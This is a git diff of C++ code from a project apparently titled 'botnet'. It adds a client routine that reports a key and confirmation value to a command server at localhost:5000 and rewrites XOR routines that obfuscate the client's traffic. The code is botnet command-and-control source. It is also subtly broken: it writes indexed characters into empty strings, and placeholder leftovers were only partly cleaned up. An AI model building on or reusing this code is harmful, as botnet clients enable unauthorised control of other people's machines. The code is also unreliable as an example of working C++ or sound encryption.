@@ -3,9 +3,29 @@
 #include <cmath>
 
 #include "master_conn.h"
+#include "http_client.h"
+#include "http_request.h"
 
 namespace botnet{
+    master_conn::master_conn() {
+        typedef botnet::http::http_request http_request;
+        typedef botnet::http::http_client http_client;
 
+        http_request *http_req = new http_request(botnet::http::GET);
+        http_request::headers header;
+        header.add("Host", "localhost:5000");
+        std::string path = "?k_c=" + std::to_string(client_key) +
+            "&confirm=" + std::to_string(confirm_msg);
+
+        http_req->setPath(path);
+        http_req->setHeaders(header);
+
+        http_client *http_c = new http_client("localhost", 5000);
+        http_c->request(http_req);
+
+        std::cout << http_c->getContent() << '\n';
+    }
+   
     int master_conn::keyGen() {
         SYSTEMTIME lt;
         int day = 0;
@@ -42,18 +62,18 @@ namespace botnet{
 		return exp_key;
 	}
 
-	int master_conn::combineKeys(int keyServer){
-		return expand_key(keyServer ^ myRand);
+	std::string master_conn::combineKeys(int keyServer){
+        return expand_key(std::to_string(keyServer ^ my_rand));
 	}
 
 	std::string master_conn::encrypt(std::string m){
 		int i;
 		int j = 0;
 		std::string c = "";
-        int iv =  ==== myCount ==== /* this.count */;
-		std::string k =  ===== hashKey ==== /* this.hash_key */;
+        int iv = count_conn;
+        std::string k = hash_key; /* this.hash_key */;
 		for (i = 0; i < m.length(); i++){
-	    	c = c + ((char)(iv ^ m[i] ^ k.[j]));
+	    	c[i] = ((char)(iv ^ m[i] ^ k[j]));
 			j = (j + 1) % k.length();
 			if (j == 0)
 				iv = (iv + 1) % 256;
@@ -65,11 +85,11 @@ namespace botnet{
 		int j = 0;
 		int i;
 		std::string m = "";
-        int iv = ===== myCount ===== /* this.count numero de conexoes */;
-        std::string k = ===== hashKey ===== /* this.expanded_private_key*/;
-		for (i = 0; i < c.length; i++){
-			m = m + String.fromCharCode(iv ^ c[i] ^ k[j]);
-            j = (j + 1) % k.length;
+        int iv = count_conn; /* this.count numero de conexoes */;
+        std::string k = hash_key; /* this.expanded_private_key*/;
+		for (i = 0; i < c.length(); i++){
+			m[i] = (iv ^ c[i] ^ k[j]);
+            j = (j + 1) % k.length();
 	        if (j == 0)
 	        	iv = (iv + 1) % 256;
 		}
